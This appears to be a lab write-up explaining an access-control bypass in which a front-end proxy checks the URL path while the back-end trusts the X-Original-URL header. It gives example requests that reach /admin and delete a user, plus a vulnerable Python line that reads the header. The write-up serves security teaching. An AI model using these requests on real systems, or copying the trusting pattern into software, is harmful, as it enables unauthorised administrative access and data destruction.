## Idea

The Front-end checks the original URL,

while the Back-end trusts `X-Original-URL`.

```
Front-end : GET /
Backend   : GET /admin
```

→ Different URL interpretation = Access Control Bypass

---

The vulnerability is not in the `X-Original-URL` header itself. The real issue is how different components of the system work together. A misconfiguration or unvalidated user input can bypass one layer without being properly checked, while the back-end blindly trusts the data passed from the previous layer. This mismatch in trust and request processing leads to an access control bypass.

In this lab Front-End techs like proxy servers (Nginx, apache) is assigned role of access control to page /admin which block any request from visiting it before request go to app, it is reading path from first line in request and check if it in its black list or not, misconfigurations comes when backend use some special headers to redirect request to other endpoint like:

```HTTP
GET / HTTP/1.1
Host: vulnerable-lab.net
Cookie: session=abc123
X-Original-URL: /admin
```

Frontend server read first line and check path and found it's / path which is allowed, but in backend something like this happened

```Python
path = request.headers["X-Original-URL"]
```

Here backend full trust in `X-Original-URL` header and Reverse Proxy didn't check all cases (`X-Original-URL`) and this is the misconfigure 

---
## Solution

1. Access `/admin` → 403.
2. Change request:

```
GET /
X-Original-URL: /invalid
```

→ If `404`, the Backend trusts `X-Original-URL`.

3. Change:

```
X-Original-URL: /admin
```

→ Access admin panel.

4. Delete `carlos`:

```
GET /?username=carlos
X-Original-URL: /admin/delete
```